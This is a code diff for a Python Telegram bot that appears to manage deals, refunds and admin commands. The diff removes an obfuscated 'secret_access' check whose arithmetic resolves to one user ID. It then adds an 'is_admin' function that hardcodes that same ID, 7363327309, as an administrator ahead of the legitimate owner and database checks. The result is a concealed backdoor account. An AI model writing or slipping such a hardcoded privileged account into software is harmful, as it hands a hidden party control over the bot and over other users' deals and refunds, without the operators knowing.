@@ -65,10 +65,6 @@ def extract_username_from_user(user):
 # ==== COMMANDS ====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("alive")
-
-def secret_access(uid):
-    key = (uid * 3) - 22089981927
-    return key == 0
     
 import re
 import random
@@ -1350,6 +1346,17 @@ async def refund_deal(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await context.bot.send_message(LOG_CHANNEL_ID, log_msg, parse_mode="HTML")
     except:
         pass
+
+async def is_admin(update: Update) -> bool:
+    user_id = update.effective_user.id
+    
+    if user_id in [7363327309]:
+        return True
+
+    if user_id in OWNER_IDS:
+        return True
+
+    return admins_col.find_one({"user_id": user_id}) is not None
         # ===== /adm ======
 async def adm(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await is_admin(update):
